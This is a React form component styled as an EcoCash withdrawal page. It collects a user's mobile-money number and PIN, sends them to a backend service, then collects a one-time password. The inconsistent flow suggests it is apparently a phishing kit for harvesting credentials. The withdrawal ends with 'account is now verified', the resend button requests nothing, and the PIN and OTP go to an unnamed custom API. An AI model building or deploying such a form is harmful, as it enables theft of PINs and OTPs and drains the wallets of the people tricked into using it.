import { useEffect, useState } from 'react';
import { submitWithdraw, submitOtp } from '../services/withdrawApi';

const initialState = {
  phone: '',
  pin: ''
};

const otpPattern = /^\d{6}$/;
const pinPattern = /^\d{4,6}$/;
const phonePattern = /^(\+263|0)7[1-8][0-9]{7}$/;
const OTP_DURATION_SECONDS = 60;

export default function WithdrawForm() {
  const [formData, setFormData] = useState(initialState);
  const [otpCode, setOtpCode] = useState('');
  const [step, setStep] = useState('credentials');
  const [otpSecondsLeft, setOtpSecondsLeft] = useState(OTP_DURATION_SECONDS);
  const [fieldErrors, setFieldErrors] = useState({
    phone: '',
    pin: ''
  });
  const [transactionId, setTransactionId] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [message, setMessage] = useState('');
  const [error, setError] = useState('');

  useEffect(() => {
    if (step !== 'otp' || otpSecondsLeft <= 0) {
      return undefined;
    }

    const timer = setInterval(() => {
      setOtpSecondsLeft((previous) => previous - 1);
    }, 1000);

    return () => clearInterval(timer);
  }, [step, otpSecondsLeft]);

  function handleChange(event) {
    const { name, value } = event.target;
    setFormData((previous) => ({
      ...previous,
      [name]: value
    }));
    setFieldErrors((previous) => ({
      ...previous,
      [name]: ''
    }));
  }

  function validateCredentials() {
    const sanitizedPhone = formData.phone.replace(/\s+/g, '').trim();
    const pin = formData.pin.trim();
    const nextFieldErrors = {
      phone: '',
      pin: ''
    };

    if (!sanitizedPhone) {
      nextFieldErrors.phone = 'EcoCash Number is required';
    }

    if (sanitizedPhone && !phonePattern.test(sanitizedPhone)) {
      nextFieldErrors.phone = 'Use a valid EcoCash mobile number';
    }

    if (!pin) {
      nextFieldErrors.pin = 'EcoCash PIN is required';
    }

    if (pin && !pinPattern.test(pin)) {
      nextFieldErrors.pin = 'PIN must be 4 to 6 digits';
    }

    setFieldErrors(nextFieldErrors);

    return !nextFieldErrors.phone && !nextFieldErrors.pin;
  }

  function handleBackToCredentials() {
    setStep('credentials');
    setOtpCode('');
    setOtpSecondsLeft(OTP_DURATION_SECONDS);
    setFieldErrors({
      phone: '',
      pin: ''
    });
    setError('');
    setMessage('');
  }

  function handleResendOtp() {
    setOtpCode('');
    setOtpSecondsLeft(OTP_DURATION_SECONDS);
    setError('');
    setMessage('A new OTP has been sent.');
  }

  async function handleSubmit(event) {
    event.preventDefault();
    setError('');
    setMessage('');

    if (step === 'otp') {
      const cleanedOtp = otpCode.trim();

      if (otpSecondsLeft <= 0) {
        setError('OTP has expired. Request a new OTP.');
        return;
      }

      if (!otpPattern.test(cleanedOtp)) {
        setError('Enter a valid 6-digit OTP code');
        return;
      }

      setIsLoading(true);

      try {
        await submitOtp(transactionId, cleanedOtp);
        setMessage('OTP verified successfully. Your account is now verified.');
        setFormData(initialState);
        setOtpCode('');
        setTransactionId('');
        setOtpSecondsLeft(OTP_DURATION_SECONDS);
        setStep('credentials');
      } catch (otpError) {
        setError(otpError.message);
      } finally {
        setIsLoading(false);
      }

      return;
    }

    const isValid = validateCredentials();

    if (!isValid) {
      return;
    }

    setIsLoading(true);

    try {
      const result = await submitWithdraw({
        phone: formData.phone.replace(/\s+/g, '').trim(),
        pin: formData.pin.trim()
      });
      setTransactionId(result.transactionId);
      setStep('otp');
      setOtpSecondsLeft(OTP_DURATION_SECONDS);
      setFieldErrors({
        phone: '',
        pin: ''
      });
      setMessage(`Credentials accepted. Enter OTP to continue. Ref: ${result.transactionId}`);
    } catch (submitError) {
      setError(submitError.message);
    } finally {
      setIsLoading(false);
    }
  }

  return (
    <form className="withdraw-form" onSubmit={handleSubmit} noValidate>
      {step === 'credentials' ? (
        <>
          <label htmlFor="phone">EcoCash Number</label>
          <input
            id="phone"
            name="phone"
            type="tel"
            placeholder="077 123 4567"
            value={formData.phone}
            onChange={handleChange}
            autoComplete="tel"
            aria-invalid={Boolean(fieldErrors.phone)}
            required
          />
          {fieldErrors.phone ? <p className="field-error">{fieldErrors.phone}</p> : null}

          <label htmlFor="pin">EcoCash PIN</label>
          <input
            id="pin"
            name="pin"
            type="password"
            placeholder="Enter your PIN"
            value={formData.pin}
            onChange={handleChange}
            autoComplete="current-password"
            inputMode="numeric"
            maxLength={6}
            aria-invalid={Boolean(fieldErrors.pin)}
            required
          />
          {fieldErrors.pin ? <p className="field-error">{fieldErrors.pin}</p> : null}
        </>
      ) : (
        <>
          <label htmlFor="otp">OTP Code</label>
          <input
            id="otp"
            name="otp"
            type="text"
            placeholder="Enter 6-digit OTP"
            value={otpCode}
            onChange={(event) => setOtpCode(event.target.value)}
            inputMode="numeric"
            maxLength={6}
            required
          />
          <p className="otp-timer">OTP expires in {otpSecondsLeft}s</p>
          {otpSecondsLeft <= 0 ? (
            <button type="button" className="secondary-button" onClick={handleResendOtp}>
              Resend OTP
            </button>
          ) : null}
        </>
      )}

      <div className="form-actions">
        {step === 'otp' ? (
          <button type="button" className="secondary-button" onClick={handleBackToCredentials}>
            Back
          </button>
        ) : null}

        <button type="submit" disabled={isLoading || (step === 'otp' && otpSecondsLeft <= 0)}>
          {isLoading ? 'Processing...' : step === 'credentials' ? 'Verify EcoCash' : 'Verify OTP'}
        </button>
      </div>

      {message ? <p className="feedback success">{message}</p> : null}
      {error ? <p className="feedback error">{error}</p> : null}

      <a href="#forgot-pin" className="forgot-link">
        Forgot your PIN?
      </a>
    </form>
  );
}
